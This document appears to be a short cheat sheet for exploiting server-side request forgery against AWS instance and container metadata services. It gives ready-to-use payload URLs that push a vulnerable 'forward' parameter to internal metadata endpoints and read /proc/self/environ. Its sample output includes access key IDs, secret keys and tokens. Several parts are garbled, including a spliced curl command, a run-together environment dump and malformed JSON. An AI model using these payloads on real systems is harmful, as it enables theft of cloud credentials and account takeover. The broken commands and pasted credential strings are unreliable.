# Metadata Server Side Request Forgery (SSRF)

## WARNING: Only working with IMDSv1. Enabling IMDSv2 : aws ec2 modify-instance-metadataoptions --instance-id <INSTANCE-ID> --profile <AWS_PROFILE> --http-endpoint enabled --http-token required .

### In order to usr IMDSv2 you must provide a token.

 - export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "http://169.254.169.254/curl -H "X-aws-ec2-metadata-token:$TOKEN" -v "http://169.254.169.254/latest/meta-data"

# Method for Elastic Cloud Compute (EC2)

### Example: https://awesomeapp.com/forward?target=http://169.254.169.254/latest/metadata/iam/security-credentials/Awesome-WAF-Role/

## 1) Access the IAM : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/

 - ami-id

 - ami-launch-index

 - ami-manifest-path

 - block-device-mapping/

 - events/

 - hostname

 - iam/

 - identity-credentials/

 - instance-action

 - instance-id

## 2) Find the name of the role assigned to the instance: https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/

## 3) Extract the role's temporary keys: https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAFRole/

{
"Code" : "Success",
"LastUpdated" : "2019-07-31T23:08:10Z",
"Type" : "AWS-HMAC",
"AccessKeyId" : "ASIA54BL6PJR37YOEP67",
"SecretAccessKey" : "OiAjgcjm1oi2xxxxxxxxOEXkhOMhCOtJMP2",
"Token" : "AgoJb3JpZ2luX2VjEDU86Rcfd/34E4rtgk8iKuTqwrRfOppiMnv",
"Expiration" : "2019-08-01T05:20:30Z"
}

# Method for Container Service (Fargate)

## 1) Fetch the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI variable from: https://awesomeapp.com/download?file=/proc/self/environ

JAVA_ALPINE_VERSION=8.212.04-r0
HOSTNAME=bbb3c57a0ed3SHLVL=1PORT=8443HOME=/root
AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/d22070e0-5f22-4987-ae90-
AWS_EXECUTION_ENV=AWS_ECS_FARGATEMVN_VER=3.3.9JAVA_VERSION=8u212AWS_DEFAULT_REGION=ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/cb4f6285-48f2-4a51-a787-67dbe61c13ffPATH

## 2) Use the credential URL to dump the AccessKey and SecretKey: https://awesomeapp.com/forward?target=http://169.254.170.2/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447

{
"RoleArn": "arn:aws:iam::953574914659:role/awesome-waf-role",
"AccessKeyId": "ASIA54BL6PJR2L75XHVS",
"SecretAccessKey": "j72eTy+WHgIbO6zpe2DnfjEhbObuTBKcemfrIygt",
"Token": "FQoGZXIvYXdzEMj//////////wEaDEQW+wwBtaoyqH5lNSLGBF3PnwnLYa3ggfKBtLMoWCEyYklw6YX85koqNwKMYrP6ymcjv4X2gF5enPi9/"Expiration": "2019-09-18T04:05:59Z"
}
